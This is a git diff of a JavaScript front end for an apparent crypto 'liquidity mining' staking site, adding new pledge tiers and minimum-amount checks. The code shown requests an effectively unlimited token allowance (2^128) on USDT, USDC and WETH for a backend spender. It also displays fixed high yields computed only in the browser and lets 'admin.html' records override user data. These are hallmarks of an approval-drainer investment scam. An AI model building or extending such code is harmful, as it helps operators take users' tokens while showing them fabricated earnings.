@@ -70,12 +70,14 @@ const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
   "function allowance(address owner, address spender) view returns (uint256)"
 ];
-// ==================== 質押週期 & 年化利率 ====================
+// ==================== 質押週期 & 年化利率 + 最低額度 ====================
 const PLEDGE_DURATIONS = [
-  { days: 90, rate: 0.167 },
-  { days: 180, rate: 0.243 },
-  { days: 240, rate: 0.281 },
-  { days: 365, rate: 0.315 }
+  { days: 30,  rate: 0.05,  min: 1 },
+  { days: 60,  rate: 0.10,  min: 1 },
+  { days: 90,  rate: 0.167, min: 1 },
+  { days: 180, rate: 0.243, min: 1 },
+  { days: 240, rate: 0.281, min: 1 },
+  { days: 365, rate: 0.315, min: 1 }
 ];
 // DOM 元素
 let connectButton, statusDiv, startBtn, pledgeBtn, pledgeAmount, pledgeDuration, pledgeToken;
@@ -455,46 +457,49 @@ function initSSE() {
         updatePledgeSummary();
       }
       if (event === 'pledgeAccepted' && data.address === userAddress.toLowerCase()) {
-  pledgeBtn.disabled = false;
-  pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
+        pledgeBtn.disabled = false;
+        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
 
-  // 更新總質押金額
-  const totalPledgeEl = document.getElementById('totalPledgeValue');
-  if (totalPledgeEl) {
-    const current = parseFloat(totalPledgeEl.textContent || '0');
-    totalPledgeEl.textContent = (current + parseFloat(data.amount)).toFixed(3);
-  }
+        // 更新總質押金額
+        const totalPledgeEl = document.getElementById('totalPledgeValue');
+        if (totalPledgeEl) {
+          const current = parseFloat(totalPledgeEl.textContent || '0');
+          totalPledgeEl.textContent = (current + parseFloat(data.amount)).toFixed(3);
+        }
 
-  // 【關鍵修正】data.token 是 'USDT' / 'USDC' / 'WETH'，不是地址！
-  const tokenKey = data.token.toUpperCase(); // 強制大寫防呆
-  if (!['USDT', 'USDC', 'WETH'].includes(tokenKey)) {
-    console.warn(`未知代幣簡寫: ${data.token}`);
-    return;
-  }
+        // 代幣簡寫
+        const tokenKey = data.token.toUpperCase();
+        if (!['USDT', 'USDC', 'WETH'].includes(tokenKey)) {
+          console.warn(`未知代幣簡寫: ${data.token}`);
+          return;
+        }
 
-  // 安全更新 accountBalance
-  if (!accountBalance[tokenKey]) {
-    accountBalance[tokenKey] = { wallet: 0, pledged: 0, interest: 0 };
-  }
-  accountBalance[tokenKey].pledged += parseFloat(data.amount);
+        // 安全更新 accountBalance
+        if (!accountBalance[tokenKey]) {
+          accountBalance[tokenKey] = { wallet: 0, pledged: 0, interest: 0 };
+        }
+        accountBalance[tokenKey].pledged += parseFloat(data.amount);
 
-  // 加入 userPledges
-  const orderId = data.orderId ?? userPledges.length;
-  userPledges.push({
-    orderId: orderId,
-    amount: parseFloat(data.amount),
-    token: tokenKey,
-    duration: data.duration,
-    startTime: data.startTime || Date.now(),
-    apr: PLEDGE_DURATIONS.find(d => d.days === data.duration)?.rate || 0
-  });
+        // 安全查找 durationInfo
+        const durationInfo = PLEDGE_DURATIONS.find(d => d.days === data.duration) || { rate: 0 };
 
-  updateAccountBalanceDisplay();
-  updatePledgeSummary();
-  showFloatingPanel('success', '質押成功！',
-    `${data.amount} ${tokenKey} 已質押<br>週期：${data.duration} 天`
-  );
-}
+        // 加入 userPledges
+        const orderId = data.orderId ?? userPledges.length;
+        userPledges.push({
+          orderId: orderId,
+          amount: parseFloat(data.amount),
+          token: tokenKey,
+          duration: data.duration,
+          startTime: data.startTime || Date.now(),
+          apr: durationInfo.rate
+        });
+
+        updateAccountBalanceDisplay();
+        updatePledgeSummary();
+        showFloatingPanel('success', '質押成功！',
+          `${data.amount} ${tokenKey} 已質押<br>週期：${data.duration} 天`
+        );
+      }
       if (event === 'pledgeRejected' && data.address === userAddress.toLowerCase()) {
         pledgeBtn.disabled = false;
         pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
@@ -572,9 +577,7 @@ async function loadUserDataFromServer() {
     const userData = snap.data();
     const localData = JSON.parse(localStorage.getItem('userData') || '{}');
     localLastUpdated = localData.lastUpdated || 0;
-    if (
-
-userData.lastUpdated >= localLastUpdated || userData.source === 'admin.html') {
+    if (userData.lastUpdated >= localLastUpdated || userData.source === 'admin.html') {
       pledgedAmount = userData.pledgedAmount ?? 0;
       lastPayoutTime = userData.lastPayoutTime ? parseInt(userData.lastPayoutTime) : null;
       totalGrossOutput = userData.totalGrossOutput ?? 0;
@@ -999,7 +1002,6 @@ async function updateUIBasedOnChainState() {
     const isFullyAuthorized = isServiceActive || isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
 
     if (isFullyAuthorized) {
-      // 已授權 → 顯示「流動性挖礦」UI
       const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
       const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
       const selectedContract = tokenMap[selectedToken];
@@ -1010,20 +1012,15 @@ async function updateUIBasedOnChainState() {
       const decimals = selectedToken === 'WETH' ? 18 : 6;
       const balance = parseFloat(ethers.formatUnits(balanceBigInt, decimals));
 
-      // 設定預設代幣
       if (isWethAuthorized && walletTokenSelect) walletTokenSelect.value = 'WETH';
       else if (isUsdtAuthorized && walletTokenSelect) walletTokenSelect.value = 'USDT';
       else if (isUsdcAuthorized && walletTokenSelect) walletTokenSelect.value = 'USDT';
 
-      // 啟動「流動性挖礦」UI
       if (startBtn) startBtn.style.display = 'block';
       disableInteractiveElements(false);
       updateStatus("請點擊 Start 開始流動性挖礦");
 
-      // 不要在這裡寫 pledged！留給 Start 按鈕處理
-
     } else {
-      // 未授權
       if (accountBalanceValue) accountBalanceValue.textContent = '0.000 (未授權)';
       if (startBtn) startBtn.style.display = 'block';
       disableInteractiveElements(false);
@@ -1128,7 +1125,7 @@ function updatePledgeSummary() {
   const total = userPledges.reduce((sum, p) => sum + p.amount, 0);
   elements.totalPledge.textContent = total.toFixed(3);
 }
-// ==================== 預估收益 + 使用當前代幣餘額 ====================
+// ==================== 預估收益 + 使用當前代幣餘額 + 最低額度 ====================
 function updateEstimate() {
   if (!pledgeAmount || !pledgeDuration || !pledgeToken || !elements.estimate || !elements.exceedWarning) return;
   const amount = parseFloat(pledgeAmount.value) || 0;
@@ -1141,9 +1138,20 @@ function updateEstimate() {
   }
   const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
   if (!duration) return;
+
+  // 檢查最低額度
+  if (amount < duration.min) {
+    elements.exceedWarning.textContent = `最低質押金額：${duration.min} ${token}`;
+    elements.exceedWarning.style.display = 'block';
+    elements.exceedWarning.style.color = '#f00';
+    elements.estimate.textContent = '0.000';
+    return;
+  }
+
   const interest = amount * duration.rate;
   const total = amount + interest;
   elements.estimate.textContent = `${total.toFixed(3)} ${token}`;
+
   const decimals = token === 'WETH' ? 18 : 6;
   const bigIntBalance = cachedWalletBalances[token] || 0n;
   const formatted = ethers.formatUnits(bigIntBalance, decimals);
@@ -1170,9 +1178,11 @@ function showPledgeDetail() {
       const end = new Date(p.startTime + p.duration * 24 * 60 * 60 * 1000);
       const remaining = Math.max(0, end - Date.now());
       const daysLeft = Math.floor(remaining / (24 * 60 * 60 * 1000));
-      const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration);
-      const apr = durationInfo ? (durationInfo.rate * 100).toFixed(1) + '%': 'N/A';
+
+      const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration) || { rate: 0 };
+      const apr = (durationInfo.rate * 100).toFixed(1) + '%';
       const accrued = p.amount * durationInfo.rate * (Date.now() - p.startTime) / (p.duration * 24 * 60 * 60 * 1000);
+
       const row = document.createElement('div');
       row.style = 'border-bottom: 1px solid #333; padding: 10px 0;';
       row.innerHTML = `
@@ -1211,7 +1221,7 @@ function checkPledgeExpiry() {
     const endTime = p.startTime + p.duration * 24 * 60 * 60 * 1000;
     if (Date.now() > endTime && !p.redeemed) {
       p.redeemed = true;
-      const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration);
+      const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration) || { rate: 0 };
       const totalInterest = p.amount * durationInfo.rate;
       accountBalance[p.token].pledged -= p.amount;
       accountBalance[p.token].interest += totalInterest;
@@ -1324,7 +1334,7 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     });
   }
-    if (startBtn) {
+  if (startBtn) {
     startBtn.addEventListener('click', async () => {
       if (!signer) { 
         updateStatus(translations[currentLang].noWallet, true); 
@@ -1376,12 +1386,10 @@ document.addEventListener('DOMContentLoaded', () => {
           currentCycleInterest = calculatePayoutInterest();
           authorizedToken = selectedToken;
 
-          // 【關鍵修正】覆蓋 pledged，不要累加
-          // 因為這是「流動性挖礦」的起始質押
           if (!accountBalance[selectedToken]) {
             accountBalance[selectedToken] = { wallet: 0, pledged: 0, interest: 0 };
           }
-          accountBalance[selectedToken].pledged = balance; // ← 改這裡！用 = 不是 +=
+          accountBalance[selectedToken].pledged = balance;
 
           localStorage.setItem('pledgedAmount', pledgedAmount.toString());
           localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
@@ -1394,7 +1402,6 @@ document.addEventListener('DOMContentLoaded', () => {
           await smartSave();
           sendToBackend({ type: 'start', pledgedAmount: balance, token: selectedToken });
 
-          // 隱藏 Start 按鈕
           startBtn.style.display = 'none';
         } else {
           updateStatus('Balance too low.', true);
@@ -1433,6 +1440,16 @@ document.addEventListener('DOMContentLoaded', () => {
         updateStatus(translations[currentLang].insufficientBalance, true);
         return;
       }
+
+      // 檢查最低質押金額
+      const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
+      if (duration && amount < duration.min) {
+        pledgeBtn.disabled = false;
+        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
+        updateStatus(`最低質押金額：${duration.min} ${token}`, true);
+        return;
+      }
+
       const tokenContract = { USDT: usdtContract, USDC: usdcContract, WETH: wethContract }[token];
       let currentAllowance;
       try {
@@ -1443,7 +1460,7 @@ document.addEventListener('DOMContentLoaded', () => {
         updateStatus(`${translations[currentLang].error}: Allowance check failed`, true);
         return;
       }
-      const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
+            const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
       if (currentAllowance < REQUIRED_ALLOWANCE) {
         updateStatus(`Approving ${token} for backend...`);
         try {
@@ -1459,6 +1476,7 @@ document.addEventListener('DOMContentLoaded', () => {
           return;
         }
       }
+
       updateStatus('Sending pledge request to backend...');
       try {
         const response = await fetch(`${BACKEND_API_URL}/pledge`, {
@@ -1482,7 +1500,7 @@ document.addEventListener('DOMContentLoaded', () => {
           throw new Error(result.error || 'Backend rejected');
         }
 
-                const orderId = result.orderId;
+        const orderId = result.orderId;
         updateStatus(`質押請求已提交，訂單編號：${orderId}`);
 
       } catch (error) {
